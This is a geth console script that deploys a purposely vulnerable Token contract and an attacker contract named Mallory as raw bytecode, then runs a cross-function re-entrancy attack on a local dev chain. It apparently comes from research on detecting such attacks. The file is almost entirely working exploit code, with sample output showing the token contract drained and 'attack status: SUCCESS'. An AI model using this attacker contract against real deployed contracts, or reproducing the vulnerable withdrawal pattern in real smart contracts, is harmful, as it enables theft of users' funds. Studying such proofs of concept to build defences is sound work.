// Script for deploying and running a cross-function re-entrancy attack against
// a crafted vulnerable contract (see cross-function.sol)
//
// usage: first start geth in developer mode (no mining difficulty and
// prefundend accounts) and start the JavaScript console interface of geth:
//
// $ geth --dev --dev.period=1 console
//
// Then load this script to setup everything:
//
// > loadScript("cross-function_setup.js")
//
// Sometimes it takes a while for all contracts to be mined and commited to the
// dev blockchain. Manually creating more transactions helps. Simply type:
//
// > transferSomething()
//
// If both the Token and Mallory contracts have been mined, the attack can be
// started:
//
// > triggerAttack()
//
//
// Example:
//
// > loadScript("./cross-function_setup.js")
//
// === Cross-Function Re-Entrancy Attack Example ===
//
// creating/unlocking accounts
// making Token
// null [object Object]
//
// ===============================================================================
// Wait for Token and Mallory contracts to be mined.
// Sometimes things hang and manually calling the transferSomething() function a bunch of times until all contracts are mined resolves this. You should see a message that Mallory and Token contract are mined.
// Use triggerAttack() to start the attack
// ===============================================================================
//
// true
// > null [object Object]
// Token Contract mined! address: 0x89f60adfb0f4d43314343c9e0df7b01b16a517c6 transactionHash: 0x0c8c6975b66ebd9dabfa334600518b8f146b5b71589ae2e895c6e64c5695f342
// making Mallory
// null [object Object]
// null [object Object]
// Mallory Contract mined! address: 0xc7661ce09714d4a1418c186862fb2164ae6c69af transactionHash: 0xc3d9d5f84af947a8de38a58d4e296ea3752d00640d36d24bf4a546c740e93613
//
// > t = triggerAttack()
//
// token   has 1000 wei
// mallory has 1000 wei
// mallory has 0 tokens
// mallory has 0 wei in token
//
// performing attack setup
//
// token   has 2000 wei
// mallory has 0 wei
// mallory has 499 tokens
// mallory has 2 wei in token
//
// starting attack
//
// token   has 2 wei
// mallory has 1998 wei
// mallory has 0 tokens
// mallory has 0 wei in token
//
// mallory gained 998 wei
// attack status: SUCCESS



console.log("\n=== Cross-Function Re-Entrancy Attack Example ===\n")

console.log("creating/unlocking accounts");

var defaultPassword = "";

personal.newAccount(defaultPassword)
personal.newAccount(defaultPassword)
function unlockAllAccounts() {
  personal.unlockAccount(eth.accounts[0], defaultPassword)
  personal.unlockAccount(eth.accounts[1], defaultPassword)
  personal.unlockAccount(eth.accounts[2], defaultPassword)
}
unlockAllAccounts()

attacker = eth.accounts[2]
eth.sendTransaction({from: eth.accounts[0], to: attacker, value: 100000000000000000000000})
admin.sleepBlocks(1)

function transferSomething() {
  // sometimes things are stuck for some reason
  eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[1], value: 100})
  admin.sleepBlocks(3)
}


var tokenContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferToken","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"exchangeTokens","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"exchangeEther","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"exchangeAndWithdrawToken","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getTokenCount","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"withdrawAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"depositEther","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"x","type":"address"}],"name":"getEtherCountFor","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"x","type":"address"}],"name":"getTokenCountFor","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"}]);
var token_create_data = {
  from: web3.eth.accounts[0],
  data: '0x608060405234801561001057600080fd5b50600280819055506109e8806100276000396000f3fe608060405260043610610099576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631072cbea1461009e57806340477126146100f95780635572f9c6146101345780637555bfd71461016257806378a895671461019d578063853828b6146101c857806398ea5fca146101df578063b717dadf146101e9578063eccbf4cc1461024e575b600080fd5b3480156100aa57600080fd5b506100f7600480360360408110156100c157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506102b3565b005b34801561010557600080fd5b506101326004803603602081101561011c57600080fd5b8101908080359060200190929190505050610397565b005b6101606004803603602081101561014a57600080fd5b8101908080359060200190929190505050610485565b005b34801561016e57600080fd5b5061019b6004803603602081101561018557600080fd5b81019080803590602001909291905050506105ca565b005b3480156101a957600080fd5b506101b26106f0565b6040518082815260200191505060405180910390f35b3480156101d457600080fd5b506101dd610736565b005b6101e76108d2565b005b3480156101f557600080fd5b506102386004803603602081101561020c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061092b565b6040518082815260200191505060405180910390f35b34801561025a57600080fd5b5061029d6004803603602081101561027157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610974565b6040518082815260200191505060405180910390f35b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151561039357806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b5050565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015156104825760006002548202905080600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550505b50565b34600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555080600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015156105c75760006002548281151561052957fe5b04905081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550505b50565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020541015156106ed5760006002546000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054029050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501580156106ea573d6000803e3d6000fd5b50505b50565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905090565b6000600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490506000821180156107cd5750600081115b156108ce5760006002548202830190506000600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055503373ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d8060008114610880576040519150601f19603f3d011682016040523d82523d6000602084013e610885565b606091505b50505060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505b5050565b60003411156109295734600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505b565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905091905056fea165627a7a72305820a0b7f32e3553480996e5d90643f54a346d36170928b536a2896e29f44f1576630029',
  gas: '4700000'
};

transferSomething()
var malloryContract = web3.eth.contract([{"constant":false,"inputs":[],"name":"attack","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"setup","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[{"name":"_t","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
var mallory_create_data = {
  from: attacker,
  data: '0x608060405234801561001057600080fd5b506040516020806105068339810180604052602081101561003057600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008060146101000a81548160ff0219169083151502179055505061045b806100ab6000396000f3fe608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680639e5faafc146101f0578063ba0bba40146101fa578063d0e30db014610204575b600060149054906101000a900460ff1615156101ee576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16637555bfd76000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166378a895676040518163ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160206040518083038186803b15801561014857600080fd5b505afa15801561015c573d6000803e3d6000fd5b505050506040513d602081101561017257600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156101d557600080fd5b505af11580156101e9573d6000803e3d6000fd5b505050505b005b6101f861020e565b005b6102026102ad565b005b61020c61042d565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663853828b66040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561029357600080fd5b505af11580156102a7573d6000803e3d6000fd5b50505050565b600060023073ffffffffffffffffffffffffffffffffffffffff16310390506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635572f9c682836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303818588803b15801561035c57600080fd5b505af1158015610370573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166398ea5fca3073ffffffffffffffffffffffffffffffffffffffff16316040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561041157600080fd5b505af1158015610425573d6000803e3d6000fd5b505050505050565b56fea165627a7a7230582083952b32e1f64eb268af46400f7a8b68331d57efb0c030d8f500a02b23148ecf0029',
  gas: '4700000'
};


var mallory;

console.log("making Token");
var token = tokenContract.new(
  token_create_data,
  function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
      console.log('Token Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
      console.log("making Mallory")
      mallory = malloryContract.new(
        contract.address,
        mallory_create_data, function (e, contract){
          console.log(e, contract);
          if (typeof contract.address !== 'undefined') {
            console.log('Mallory Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
          }
        })
    }
  })


transferSomething()
console.log("\n===============================================================================")
console.log("Wait for Token and Mallory contracts to be mined.")
console.log("Sometimes things hang and manually calling the transferSomething() function a bunch of times until all contracts are mined resolves this. You should see a message that Mallory and Token contract are mined.")
transferSomething()
console.log("Use triggerAttack() to start the attack")
console.log("===============================================================================\n")


function setupInitialState() {
  transferSomething();

  // give token some ether
  token.depositEther({from: eth.accounts[0], value: 1000})

  transferSomething();

  // for fun we'll exchange them to tokens
  token.exchangeTokens("0x42", {from: eth.accounts[0], value: 0})

  transferSomething();

  // give mallory some ether
  mallory.deposit({from: eth.accounts[0], value: 1000});

  transferSomething();
}

function printStatus() {
  console.log("")
  console.log("token   has " + eth.getBalance(token.address) + " wei");
  console.log("mallory has " + eth.getBalance(mallory.address) + " wei");
  console.log("mallory has " + token.getTokenCountFor(mallory.address) + " tokens");
  console.log("mallory has " + token.getEtherCountFor(mallory.address) + " wei in token");
  console.log("")
}

function triggerAttack() {
  transferSomething();
  setupInitialState();
  transferSomething();

  var preBalance = eth.getBalance(mallory.address);

  printStatus()

  console.log("performing attack setup")
  mallory.setup({from: attacker, gas: 300000, value: 0});
  transferSomething()

  printStatus()

  console.log("starting attack")
  var t = mallory.attack({from: attacker, gas: '4700000', value: 0});
  transferSomething()

  printStatus()
  var gains = (eth.getBalance(mallory.address) - preBalance);
  console.log("mallory gained " + gains + " wei");
  if (gains > 0) {
    console.log("attack status: SUCCESS");
  } else {
    console.log("attack status: FAIL");
  }

  // sereum only:
  //var r = debug.checkTransaction(t)
  //console.log("error: " + r.error)

  return t;
}


function getAttackTrace() {
  a = triggerAttack();
  return debug.traceTransaction(a);
}
